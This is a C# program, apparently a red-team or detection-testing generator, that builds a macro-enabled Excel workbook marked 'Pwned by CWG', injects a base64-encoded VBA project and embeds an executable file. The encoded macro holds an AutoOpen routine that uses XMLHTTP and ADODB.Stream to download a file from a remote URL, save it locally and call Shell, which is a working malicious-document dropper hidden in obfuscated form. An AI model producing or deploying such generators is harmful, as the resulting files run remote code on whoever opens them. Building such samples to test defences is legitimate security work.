using System;
using System.IO;

using DocumentFormat.OpenXml;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Spreadsheet;

namespace cwg.sourceXLSM
{
    class Program
    {
        //read in the vba into variable
        private static string partData = "0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAAQAAAAAAAAAAEAAAAgAAAAEAAAD+////AAAAAAAAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9////CQAAAP7///8EAAAABQAAAAYAAAAHAAAACAAAAAoAAAD+////CwAAAAwAAAANAAAADgAAAA8AAAAQAAAA/v///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////1IAbwBvAHQAIABFAG4AdAByAHkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAUA//////////8HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFCnYB2jdtgBAwAAAAAaAAAAAAAAVgBCAEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAQD//////////wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADBZYB2jdtgBQIBgHaN22AEAAAAAAAAAAAAAAABUAGgAaQBzAEQAbwBjAHUAbQBlAG4AdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgACAQMAAAAEAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADnAwAAAAAAAE4AZQB3AE0AYQBjAHIAbwBzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAIBBQAAAP//////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAoHAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAAJAAAACgAAAAsAAAAMAAAADQAAAA4AAAAPAAAA/v///xEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAAGQAAABoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAAnAAAAKAAAACkAAAAqAAAAKwAAACwAAAD+////LgAAAC8AAAAwAAAAMQAAADIAAAAzAAAANAAAADUAAAA2AAAANwAAADgAAAA5AAAAOgAAADsAAAA8AAAAPQAAAD4AAAA/AAAAQAAAAEEAAABCAAAAQwAAAEQAAABFAAAARgAAAEcAAABIAAAASQAAAEoAAABLAAAATAAAAE0AAABOAAAATwAAAFAAAABRAAAAUgAAAFMAAABUAAAAVQAAAP7///9XAAAAWAAAAFkAAABaAAAAWwAAAFwAAABdAAAAXgAAAP7///9gAAAA/v///2IAAABjAAAAZAAAAGUAAABmAAAAZwAAAP7///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8BFgMAAPAAAADSAgAA1AAAAAACAAD/////2QIAAC0DAAAAAAAAAQAAAFEWpCQAAP//IwEAAIgAAAC2AP//AQEAAAAA/////wAAAAD///////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAwAAAAUAAAAHAAAA//////////8BAQgAAAD/////eAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//AAAAAE1FAAD///////8AAAAA//8AAAAA//8BAQAAAADfAP//AAAAABgA//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8oAAAAAgBTTP////8AAAEAUxD/////AAABAFOU/////wAAAAACPP////8AAP//AQEAAAAAAQBOADAAewAwADAAMAAyADAAOQAwADYALQAwADAAMAAwAC0AMAAwADAAMAAtAEMAMAAwADAALQAwADAAMAAwADAAMAAwADAAMAAwADQANgB9AAAAAAAAAP////8BAUAAAAACgP7//////yAAAAD/////MAAAAAIB//8AAAAAAAAAAP//////////AAAAAGQAVAAdAAAAJQAAAP////9AAAAAAAD//wAAAQAAAAAAAAAAAP///////////////wAAAAD//////////////////////////wAAAAD//////////////////////////wAAAAAAAAAA//8AAP///////wAAAAD///////////////////////////////8AAP///////wAAAAAAAN8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+ygEAAAD/////AQEIAAAA/////3gAAAD/////AAABsLAAQXR0cmlidXQAZSBWQl9OYW0AZSA9ICJUaGkAc0RvY3VtZW4QdCINCgqMQmFzAQKMMHswMDAyMFA5MDYtABAwAwhDBwAUAhIBJDAwNDZ9gQ18R2xvYmFsAdAQU3BhYwGSRmFsBHNlDGRDcmVhdAhhYmwVH1ByZWSQZWNsYQAGSWQAsQhUcnUNQkV4cG8Ec2UUHFRlbXBsAGF0ZURlcml2AwISkkJ1c3RvbWkGegREAzIxIiB3OnRoZW1lU2hhZGU9IkJGIi8+PC93ARYDAADwAAAAqgIAANQAAACIAQAA/////7ECAABlBQAAAAAAAAEAAABRFmuoAAD//wMAAAAAAAAAtgD//wEBAAAAAP////8AAAAA////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAMAAAAFAAAABwAAAP//////////AQEIAAAA/////3gAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAAAABNRQAA////////AAAAAP//AAAAAP//AQEAAAAA3wD//wAAAAD/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAP//AQEAAAAAAAAAAAAAAAD/////AQGQAAAACxIwAv//////////AAAAAP//////////AAAAAAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAD///////////////8SAAAAAAAAAAAAAACEAAACAAAAAECEMgL///////////////8MAP//AAAAAECENgL///////////////8MAP//AAAAAP////9wAAAAAQD//wAAAAAAAAAAAAAAAAAAAAD//////////////////////////wAAAAD//////////////////////////////////////////wAAAAAAAAAA//8AAP///////wAAAAD///////////////////////////////8AAP///////wAAAAAAAN8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+ygEAEgAigQgABgAAAAAAAAAAgAkAAAAAAP////8AgQgALgAAAAgAAAAAgQgAKAAAADgAAAAAgQgAjAAAAGAAAAAAgQgACgAAAPAAAAAAgAkAAAAAAP////8AgQgACAAAAAABAAAAgQgBFgAAAAgBAAAAgQgBBgAAACABAAAAgQgBDgAAACgBAAAAgQgBKAAAADgBAAAAgQgAAgAAAGABAAAAgAkAAAAAAP////8AgQgAFAAAAGgBAAAAgAkAAAAAAP////8EgQgAAgAAAIABAAAAgAkAAAAAAP//////////AQGQAQAAlgQAAAAAAABdAPUEWAAAAEYAAADwALkAEQBNaWNyb3NvZnQuWE1MSFRUUAAkADQCAQAuADICAABdAPUEcAAAAEYAAADwALkADABBZG9kYi5TdHJlYW0kADQCAQAuADYCuQADAEdFVAC5AHQAaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL3Rlc3Q5LWV4YW1wbGUtcGF5bG9hZC50eHS6ACAAMgJCQBYBAwAAAAAAIAAyAkJAOAIAAAAAAAAAAAQBIAA2AvgArAABADkAbAHjAAsACAAvL2JpbmFyeQAAQ0AWAQAAAAAgADICIQA6AkNAhgEBAAAAuQAIAGZpbGUudHh0rAACAENAPAICAOMAGwALAC8vb3ZlcndyaXRlAHEA//+4AAAAuQAIAGZpbGUudHh0HQBBQD4CAQAAAAAAbwD//5gAAAD/////kAAAAP////8AAAGbsQBBdHRyaWJ1dABlIFZCX05hbQBlID0gIk5ldwBNYWNyb3MiDQAK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LQA1AEIARgBBAC0AMQAwADEAQgAtAEIARABFADUALQAwADAAQQBBADAAMAA0ADQARABFADUAMgB9ACMAMgAuADgAIwAwACMAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAEMAbwBtAG0AbwBuACAARgBpAGwAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAIABTAGgAYQByAGUAZABcAE8ARgBGAEkAQwBFADEANgBcAE0AUwBPAC4ARABMAEwAIwBNAGkAYwByAG8AcwBvAGYAdAAgAE8AZgBmAGkAYwBlACAAMQA2AC4AMAAgAE8AYgBqAGUAYwB0ACAATABpAGIAcgBhAHIAeQAAAAAAAAAAAAAAAAACAAIAAQAGABICAAAUAgEAFgIBABgCAAAaAgEAHAIBACIC////////AAAAAP//AABb6pZkeAD//wAA/////////////////////////////////////////////wEA////////////////////////////////AQAAAAAAAAAAAAAAAAAAAAAAAABRFgIAGABUAGgAaQBzAEQAbwBjAHUAbQBlAG4AdAAUADAAeQA2ADQAOQA2AGUAYQA0ADQA//8lAhgAVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQA//+kJAAAAAAAAAACAAAAMwMAAP//EgBOAGUAdwBNAGEAYwByAG8AcwAUADAAegA2ADQAOQA2AGUAYQA0AGUA//8uAhIATgBlAHcATQBhAGMAcgBvAHMA//9rqAAAAAAAABgCAAAAawUAAP///////wEBOAIAAP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////xgCAAD//////////////////////////////////////////////////////////wACAAD/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Jzz0erE/y0SqzkkPe08IM/////8BAAAAb8dY+0CIx0O3Bw/ujm4rgP////8BAAAA/////0gAAACAAAAAAAAgARsABgEgLQAAAADCAAWAFAD/AwAAd3JpdGUEBFdvcmS1axAAAwRWQkH34hAABQRXaW4xNsF+EAAFBFdpbjMyB38QAAUEV2luNjR4fxAAAwRNYWOzshAABARWQkE2rSMQAAQEVkJBN64jEAAIBFByb2plY3QxChcQAAYEc3Rkb2xlk2AQAAcEUHJvamVjdC2uEAAMBFRoaXNEb2N1bWVudDyeEAAJgAAA/wMDAF9FdmFsdWF0ZRjZEAAGAE5vcm1hbN/YEAAGhAgA/wMDAE9mZmljZRV1EAAHBE1vZHVsZTFiERAACQROZXdNYWNyb3OuahAACARBdXRvT3BlbtkqEAAFBHhIdHRw/gEQAAwAQ3JlYXRlT2JqZWN0+IoQAAUEYlN0cm1N9hAABABTZW5kzeQQAAwAcmVzcG9uc2VCb2R5UMQQAAoAc2F2ZXRvZmlsZR5fEAAFAFNoZWxsVtcQAAiECAD/AwEARG9jdW1lbnRq0xAAAv//AQFUAAAALwIBAAgA////////////////////////////////////////IAICAP//IgL/////JQIAAAgA////////////////KgIDAP//DgIBAP//EAIAAP//AAAOAAAAAQAkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOmNOdkdyYXBoaWNGcmFtZVByLz48YTpncmFwaGljIHhtbG5zOmE9Imh0dHA6Ly9zY2hlbWFzAQuygAEABAAAAAMAMCoCApAJAHAUBkgDAIICAGTkBAQABwAcAFByb2plY3QFUQAoAABAAhQGAhQ9rQIKBwJsARQIBhIJAhKAW+qWZHgADAJKEjwCChYAAXJzdGQQb2xlPgIZcwB0AABkAG8AbABlUAANAGgAJV4AAyoAXEd7MDAwMjCwNDMwLQAIBARDAAoDAg4BEjAwNDZ9IwAyLjAjMCNDOgBcV2luZG93cwBcU3lzdGVtMwQyXANlMi50bGIAI09MRSBBdXSAb21hdGlvbgBggwACg0VPZmZpY4RFiE8AZoAAaQBjgkUanoARlIABgUUyREYAOEQwNEMtNUIARkEtMTAxQi2QQkRFNYBFQUGAQxo0gAUyiEWAmGdyYQBtIEZpbGVzXEBDb21tb24EBk0AaWNyb3NvZnQAIFNoYXJlZFwAT0ZGSUNFMTYAXE1TTy5ETEwGI4cQg00gMTYuMAggT2KBwSBMaWKwcmFyeQBLAAEPAtOIAgATggNRFhmCqABUaGlzRG9jdYBtZW50RwAYgBOCVICraQBzAESAs6BjAHUAbYBvbsBdKhrOCzLaCxzAEgAAqkhCATFCeDNAkB5CAkUBBSzCIaQkIkIIKxFCARkACcABTmV3xE1hAT5HABKBAwAgoHcATQBhgFpyACVocwAaiwkylAlPIGsjgKVNIGuoIQAZAAAFQyAQwgIAbgA+AF4AKAA/ADoAaAB0AHQAcABzACkAOgAvAC8AKAA/ADoAWwBhAC0AegBBAC0AVGhpc0RvY3VtZW50AFQAaABpAHMARABvAGMAdQBtAGUAbgB0AAAATmV3TWFjcm9zAE4AZQB3AE0AYQBjAHIAbwBzAAAAAAAAOgAtAGQAZgB8AC0AYgB2AHQAfAAtAHMAMwB8AC0AZwBkAHwALQBjAHUAcgByAGUAbgB0AHwALQBJRD0iezI0MzFGQ0JFLUYwNDUtNDEyMy04QzZGLTBFQzVEQUQwNUU1MX0iDQpEb2N1bWVudD1UaGlzRG9jdW1lbnQvJkgwMDAwMDAwMA0KTW9kdWxlPU5ld01hY3Jvcw0KTmFtZT0iUHJvamVjdCINCkhlbHBDb250ZXh0SUQ9IjAiDQpWZXJzaW9uQ29tcGF0aWJsZTMyPSIzOTMyMjIwMDAiDQpDTUc9IkJBQjg1NjQ4NDY0QzQ2NEM0NjRDNDY0QyINCkRQQj0iQTZBNDRBN0NEQTg0Qzc4NUM3ODVDNyINCkdDPSI5MjkwN0U5MDZCOTE2QjkxOTQiDQoNCltIb3N0IEV4dGVuZGVyIEluZm9dDQomSDAwMDAwMDAxPXszODMyRDY0MC1DRjkwLTExQ0YtOEU0My0wMEEwQzkxMTAwNUF9O1ZCRTsmSDAwMDAwMDAwDQoNCltXb3Jrc3BhY2VdDQpUaGlzRG9jdW1lbnQ9MCwgMCwgMCwgMCwgQw0KTmV3TWFjcm9zPTAsIDAsIDAsIDAsIEMNCmUAbgBjAGUATQBpAGcAcgBhAHQAZQBkAD4APAAvAE0AZQB0AGEA";

        static void Main(string[] args)
        {

            //create workbook
            string currentPath = System.AppDomain.CurrentDomain.BaseDirectory;
            string filePath = currentPath + "sourceXLSM.xlsm";
            CreateSpreadsheetWorkbook(filePath);

        }


        public static void CreateSpreadsheetWorkbook(string filepath)
        {
            // Create a spreadsheet document by supplying the filepath.
            // By default, AutoSave = true, Editable = true, and Type = xlsx.
            SpreadsheetDocument spreadsheetDocument = SpreadsheetDocument.Create(filepath, SpreadsheetDocumentType.MacroEnabledWorkbook);

            // Add a WorkbookPart to the document.
            WorkbookPart workbookpart = spreadsheetDocument.AddWorkbookPart();
            workbookpart.Workbook = new Workbook();

            // Add a WorksheetPart to the WorkbookPart.
            WorksheetPart worksheetPart = workbookpart.AddNewPart<WorksheetPart>();
            worksheetPart.Worksheet = new Worksheet(new SheetData());


            // Add Sheets to the Workbook.
            Sheets sheets = spreadsheetDocument.WorkbookPart.Workbook.AppendChild<Sheets>(new Sheets());

            // Append a new worksheet and associate it with the workbook.
            Sheet sheet = new Sheet() { Id = spreadsheetDocument.WorkbookPart.GetIdOfPart(worksheetPart), SheetId = 1, Name = "mySheet" };
            sheets.Append(sheet);


            //Add pwned message
            Worksheet worksheet = new Worksheet();
            SheetData sheetData = new SheetData();
            Row row = new Row() { RowIndex = 2U, Spans = new ListValue<StringValue>() };
            Cell cell = new Cell()
            {
                CellReference = "A2",
                DataType = CellValues.String,
                CellValue = new CellValue("Pwned by CWG")
            };

            row.Append(cell);
            sheetData.Append(row);
            worksheet.Append(sheetData);
            worksheetPart.Worksheet = worksheet;
            workbookpart.Workbook.Save();

            //Inject Macros
            VbaProjectPart vbaProjectPart1 = spreadsheetDocument.WorkbookPart.AddNewPart<VbaProjectPart>("rId8");
            Stream data = GetBinaryDataStream(partData);
            vbaProjectPart1.FeedData(data);
            data.Close();


            //Inject PE file
            EmbeddedPackagePart newEmbeddedPackagePart = worksheetPart.AddNewPart<EmbeddedPackagePart>("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "rId10");
            
            using (Stream image = new FileStream(Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "sourcePE"), FileMode.Open,
                    FileAccess.Read, FileShare.Read))
            {
                newEmbeddedPackagePart.FeedData(image);
            }


            // Close the document.
            spreadsheetDocument.Close();
        }
        private static Stream GetBinaryDataStream(string base64String)
        {
            return new System.IO.MemoryStream(System.Convert.FromBase64String(base64String));
        }

    }
}
